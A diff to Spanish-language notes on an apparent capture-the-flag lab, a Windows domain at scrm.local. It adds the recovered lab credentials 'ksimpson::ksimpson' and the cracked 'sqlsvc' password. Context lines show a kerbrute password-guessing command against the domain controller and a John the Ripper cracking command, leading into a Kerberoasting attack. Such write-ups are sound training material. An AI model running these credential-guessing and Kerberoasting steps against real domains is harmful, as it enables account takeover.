@@ -85,6 +85,10 @@ kerbrute bruteuser --dc 10.129.8.117 -d scrm.local users ksimpson
 
 En este caso vemos que el usuario `ksimpson` utiliza su nombre como contraseña
 
+```ad-hint
+ksimpson::ksimpson
+```
+
 Una vez con estas credenciales validas probaremos un `KERBEROASTING Attack`
 
 #### KERBEROASTING Attack
@@ -111,3 +115,15 @@ Obteniendo un hash *TGS* el cual vamos a intentar crackear con [[JOHN THE RIPPER
 ```shell
 john -w /usr/share/wordlists/rockyou.txt hash
 ```
+
+Obteniendo el hash en texto claro con el valor 
+```ad-hint
+Pegasus60
+```
+
+Correspondiendo a la contraseña del usuario `sqlsvc`
+
+```ad-hint
+sqlvc::Pegasus60
+```
+
